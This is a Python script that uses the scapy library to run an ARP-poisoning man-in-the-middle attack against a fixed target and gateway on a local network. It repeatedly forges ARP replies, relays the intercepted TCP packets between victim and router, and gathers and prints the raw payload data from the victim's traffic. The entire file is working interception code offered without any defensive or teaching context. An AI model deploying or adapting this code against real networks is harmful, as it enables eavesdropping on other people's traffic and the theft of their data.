from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

INTERFACE       =   'eth0'
TARGET_IP       =   '10.0.0.231'
GATEWAY_IP      =   '10.0.0.1'
MY_MAC = "00:00:00:00:00:ff"
LOCK = threading.Lock()
GATEWAY_MAC = ""
TARGET_MAC = ""
data = ""

def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target():
    while 1:
       if not LOCK.locked():
          send(ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, hwdst=TARGET_MAC), count = 3)
          send(ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC), count = 3)
       time.sleep(1)
    return

def routersteal(packet):
   print "intercepted router packet"
   LOCK.acquire()
   send(ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=GATEWAY_MAC), count=3)
   send(ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=TARGET_MAC), count=3)
   packet[Ether].src = MY_MAC
   packet[Ether].dst = TARGET_MAC
   time.sleep(.3)
   send(packet)
   time.sleep(.3)
   send(ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, hwdst=TARGET_MAC))
   send(ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC))
   LOCK.release()


def victimsteal(packet):
   print "intercepted victim packet"
   LOCK.acquire()
   send(ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=GATEWAY_MAC), count = 3)
   send(ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=TARGET_MAC), count = 3)
   packet[Ether].src = MY_MAC
   packet[Ether].dst = GATEWAY_MAC

   #packet.show2()
   send(packet)
   time.sleep(.3)
   if Raw in packet:
        global data
        newdata = ''.join(str(packet[Raw].load).split())
        data += newdata
        print "[$] Data collected so far:"
        print "[ ]=====================[ ]"
        print(data)
        print "[ ]=====================[ ]"
   time.sleep(.3)
   send(ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, hwdst=TARGET_MAC))
   send(ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC))
   LOCK.release()



def sniffing():
    sniff(filter="tcp and ether src 00.00.00.00.00.01", prn=routersteal)


if __name__ == '__main__':
    conf.iface = INTERFACE
    conf.verb = 0
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    TARGET_MAC = get_mac(TARGET_IP)
    poison_thread = threading.Thread(target = poison_target)
    poison_thread.start()
    router_thread = threading.Thread(target = sniffing)

    router_thread.start()
    try:
        print '[*] Starting sniffer'
        packets = sniff(filter="tcp and ether src 00.00.00.00.00.aa", prn=victimsteal, iface=INTERFACE)
    except KeyboardInterrupt:
        sys.exit()